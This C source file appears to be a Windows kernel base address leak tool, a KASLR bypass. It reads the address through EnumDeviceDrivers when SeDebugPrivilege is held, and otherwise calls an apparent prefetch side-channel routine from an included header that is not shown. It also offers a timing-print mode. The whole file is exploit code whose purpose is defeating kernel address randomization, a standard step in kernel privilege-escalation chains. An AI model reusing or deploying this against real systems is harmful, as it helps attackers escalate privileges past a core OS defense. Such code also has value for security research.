#include <stdio.h>
#include <Windows.h>
#include "prefetch_leak.h"

typedef enum PREFETCH_OPERATION {
	LeakKernelBase,
	PrintTimings
} PREFETCH_OPERATION;

// https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html
BOOL CheckWindowsPrivilege(WCHAR* Privilege)
{
	/* Checks for Privilege and returns True or False. */
	LUID luid;
	PRIVILEGE_SET privs;
	HANDLE hProcess;
	HANDLE hToken;
	hProcess = GetCurrentProcess();
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) return FALSE;
	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bResult;
	PrivilegeCheck(hToken, &privs, &bResult);
	return bResult;
}

LPVOID GetKernelBaseAddress()
{
	LPVOID pKernelBaseAddress = 0;
	LPVOID* lpImageBase = NULL;
	DWORD dwBytesNeeded = 0;

	if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
		printf("[-] Failed to calculate bytes needed for device driver entries");
		return -1;
	}

	if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
		printf("[-] Failed to allocate heap for lpImageBase\n");
		if (lpImageBase) {
			HeapFree(GetProcessHeap(), 0, lpImageBase);
		}
		return -1;
	}

	if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
		printf("[-] EnumDeviceDrivers: %d", GetLastError());
		if (lpImageBase) {
			HeapFree(GetProcessHeap(), 0, lpImageBase);
		}
		return -1;
	}

	pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];
	HeapFree(GetProcessHeap(), 0, lpImageBase);

	printf("[*] Kernel Base Address: %llx\n", pKernelBaseAddress);

	return pKernelBaseAddress;
}


int main(int argc, char** argv)
{
	PREFETCH_OPERATION op = LeakKernelBase;

	if (CheckWindowsPrivilege(SE_DEBUG_NAME)) {
		printf("Running with SeDebugPrivilege, can use Windows API!\r\n");
		GetKernelBaseAddress();
		return 0;
	}

	if (argc > 1)
	{
		for (int i = 1; i < argc; i++)
		{
			if (strcmp(argv[i], "--print-timings") == 0 || strcmp(argv[i], "-pt") == 0)
			{
				op = PrintTimings;
			}
		}
	}

	switch (op) {
	case LeakKernelBase:
		printf("Kernel base: %p\n", leak_kernel_base_reliable());
		break;
	case PrintTimings:
		for (int i = 0; i < 10; i++) {
			print_timings();
		}
		break;
	}
	
	return 0;
}